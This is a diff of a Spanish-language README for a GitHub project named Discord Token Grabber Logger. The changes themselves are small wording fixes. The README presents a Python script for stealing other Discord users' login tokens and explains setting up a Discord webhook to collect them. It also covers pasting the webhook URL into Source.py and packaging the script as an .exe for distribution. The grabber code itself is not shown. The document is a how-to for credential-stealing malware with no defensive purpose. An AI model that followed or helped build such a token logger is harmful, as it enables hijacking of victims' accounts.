@@ -2,7 +2,7 @@
 Un pequeño código editable creado en Python para poder sacar la Token de inicio de sesión de algún usuario de Discord.
 
 # ¿COMO LO USAMOS?
-Antes de descargar el archivo **Source.py** debemos dirigirnos a nuestro Discord y crear un nuevo servidor (pueden poner el nombre que quieran). Teniendo el servidor creado debemos dirigirnos al apartado **Ajustes del Servidor**, entrando aqui debemos buscar la opcion llamada **Integraciones** y le damos click
+Antes de descargar el archivo **Source.py** debemos dirigirnos a nuestro Discord y crear un nuevo servidor (pueden poner el nombre que quieran). Teniendo el servidor creado debemos dirigirnos al apartado de **Ajustes del Servidor**, entrando aqui debemos buscar la opcion llamada **Integraciones** y le damos click
 
 ![image.png](https://github.com/G0ldenD4rk/Discord-Token-Grabber-Logger/blob/main/Integraciones.PNG?raw=true/)
 
@@ -26,11 +26,11 @@ Ahora debemos volver a nuestro Discord y entrar en la WebHook que creamos (claro
 
 ![image.png](https://github.com/G0ldenD4rk/Discord-Token-Grabber-Logger/blob/main/URL.PNG?raw=true/)
 
-Una vez hecho esto lo unico que hacemos sera guardar el codigo. Y listo, tendriamos nuestro Token Logger.
+Una vez hecho esto lo unico que hacemos sera guardar el codigo. Y listo, tendriamos nuestro Token Logger creado.
 
 Si queremos hacer que ese codigo sea un archivo .exe lo unico que haremos sera instalar la siguiente herramienta: https://github.com/brentvollebregt/auto-py-to-exe
 En YouTube hay varios tutoriales que nos enseñan a hacer esto =).
 
 # Contacto
 
-GoldenDark#6040
+**GoldenDark#6040**
